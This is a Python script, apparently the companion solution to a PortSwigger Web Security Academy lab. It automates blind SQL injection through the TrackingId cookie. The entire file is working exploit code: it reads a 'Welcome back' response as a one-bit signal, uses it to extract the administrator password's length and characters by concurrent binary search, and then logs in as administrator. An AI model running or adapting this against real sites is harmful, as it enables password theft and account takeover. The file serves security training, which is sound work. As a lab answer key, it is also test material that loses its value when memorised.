#!/usr/bin/env python3
"""
Blind SQL injection with conditional responses
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 11-blind-conditional-responses.md

What this does:
    Injects into the TrackingId cookie. Since nothing is reflected in the
    response, the only signal available is whether the page shows "Welcome
    back" -- a one-bit true/false channel. First finds the administrator
    password's length via that channel, then extracts every character with an
    ASCII binary search, run concurrently across all positions with a thread
    pool since each position's search is independent of the others.

Usage:
    python 11-blind-conditional-responses.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed


def true_signal(r: httpx.Response) -> bool:
    return "Welcome back" in r.text


def inject(client: httpx.Client, lab_url: str, tracking_id: str, session: str, suffix: str) -> httpx.Response:
    cookie = f"TrackingId={tracking_id}{suffix}; session={session}"
    return client.get(lab_url, headers={"Cookie": cookie})


def get_length(client: httpx.Client, lab_url: str, tracking_id: str, session: str) -> int:
    length_query = "SELECT LENGTH(password) FROM users WHERE username='administrator'"
    for length in range(1, 100):
        suffix = f"' AND ({length_query})={length}-- "
        if true_signal(inject(client, lab_url, tracking_id, session, suffix)):
            return length
    return 0


def get_char(lab_url: str, tracking_id: str, session: str, pos: int) -> tuple[int, str]:
    client = httpx.Client(follow_redirects=True, timeout=15)
    char_q = f"SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)"
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        suffix = f"' AND ASCII(({char_q}))>{mid}-- "
        if true_signal(inject(client, lab_url, tracking_id, session, suffix)):
            lo = mid + 1
        else:
            hi = mid - 1
    return pos, chr(lo)


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    seed = client.get(lab_url)
    tracking_id = seed.cookies.get("TrackingId", "xyz")
    session = seed.cookies.get("session", "")

    length = get_length(client, lab_url, tracking_id, session)
    if not length:
        print("[-] Could not determine password length.")
        return
    print(f"[+] Password length: {length}")

    result_chars = [""] * length
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(get_char, lab_url, tracking_id, session, i + 1): i for i in range(length)}
        for future in as_completed(futures):
            pos, ch = future.result()
            result_chars[pos - 1] = ch
            print(f"[*] Progress: {''.join(result_chars)}", end="\r")

    password = "".join(result_chars)
    print(f"\n[+] administrator's password: {password}")

    csrf = get_csrf(client, f"{lab_url}/login")
    login = client.post(f"{lab_url}/login", data={"username": "administrator", "password": password, "csrf": csrf})
    if "Log out" in login.text or "/my-account" in str(login.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed with the extracted password.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
